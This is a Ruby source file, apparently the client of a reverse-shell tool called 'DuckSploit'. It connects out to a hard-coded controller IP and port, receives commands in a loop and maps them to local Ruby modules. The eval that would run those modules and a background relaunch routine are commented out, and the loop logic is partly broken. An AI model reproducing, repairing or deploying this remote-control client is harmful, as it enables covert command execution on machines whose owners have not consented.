require "socket"

host = "192.168.1.46"
port = 8013

# dspath = "E:\DuckSploit\ruby\reverse_shell\client.rb"



# def background_check
	# sleep(5)
	# exec("E:\DuckSploit\ruby\reverse_shell\client.rb")
# end

# background_check()

loop do
	host = TCPSocket.open(host, port)
	host.puts ""
	
	loop do
		cmd = host.gets.chomp
		downcasecmd = cmd.downcase.split.first
		if downcasecmd == "exit"
			host.close
			break
		else
			begin
				filepath = "C:/DuckSploit/ruby/#{downcasecmd}.rb".chomp
				if File.exist?(filepath)
					out = "exist #{downcasecmd}\n"
					# eval File.read("C:/DuckSploit/ruby/#{downcasecmd}.rb")				
				else
					out = "Command (#{downcasecmd}) does not exist!\n"
				end
				host.puts out.gsub("\n", "\\NEWLINE")
				
			rescue
				out = "Unable to execute command\n"
			end
			host.puts out.gsub("\n", "\\NEWLINE")
		end
	end
end
exit
